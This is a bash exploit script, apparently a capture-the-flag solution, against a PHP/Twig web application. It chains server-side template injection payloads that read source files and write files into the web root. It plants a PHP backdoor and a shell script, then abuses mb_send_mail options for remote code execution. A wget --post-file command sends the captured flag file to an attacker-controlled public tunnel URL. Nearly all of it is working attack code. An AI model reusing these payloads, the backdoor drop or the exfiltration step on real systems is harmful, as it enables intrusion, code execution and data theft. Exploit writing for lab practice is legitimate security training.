#!/bin/bash

# Trick to use mb_send_mail found here
# https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass#php-command-execution

HOST='localhost:1337'
HOST='94.237.61.202:47667'
TMP_LOG=$(mktemp)

# kill all background jobs when script exits
trap "trap - SIGTERM && kill -- -$$" SIGINT SIGTERM EXIT

echo + exposing port 8000 to the internet
ssh -R 80:localhost:8000 localhost.run -- --no-inject-http-proxy-headers >$TMP_LOG 2>&1 &
while ! PUBLIC_URL=$(grep 'https://.*life' -o $TMP_LOG) ; do sleep 0.1; done
echo + using $PUBLIC_URL
http-server.py -B & # https://github.com/orrors/cheat-sheets/blob/main/samples/http-server.py

urlencode() {
	python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.stdin.read()));"
}

makerequest() {
	# the piping was only used for testing
	curl --path-as-is -isk "http://$HOST/?location=$(echo -n $1 | urlencode)" | grep "h3 class='text-center'" -A999 | head -n -11
}

# payload injection tests
# payload="{{['file:///www/src/Controller/DefaultController.php']|map('file_get_contents')|join}}"
# payload="{{['php://filter/convert.base64-encode/resource=/www/src/Controller/DefaultController.php']|map('file_get_contents')|join}}"
# makerequest "$payload"

# using options in mb_send_mail you can trigger rce
payload="{{['/www/public/pwn.sh',\"/readflag >/tmp/flag;wget $PUBLIC_URL --post-file /tmp/flag;rm /www/public/backdoor.php /www/public/pwn.sh /tmp/flag\"]|sort('file_put_contents')}}"
makerequest "$payload" >/dev/null

payload="{{['/www/public/backdoor.php',\"<?php mb_send_mail('', '', '', '', '-H \\\"sh /www/public/pwn.sh\\\"');\"]|sort('file_put_contents')}}"
makerequest "$payload" >/dev/null
# trigger RCE with the mb_send_mail function
curl -s "http://$HOST/backdoor.php"
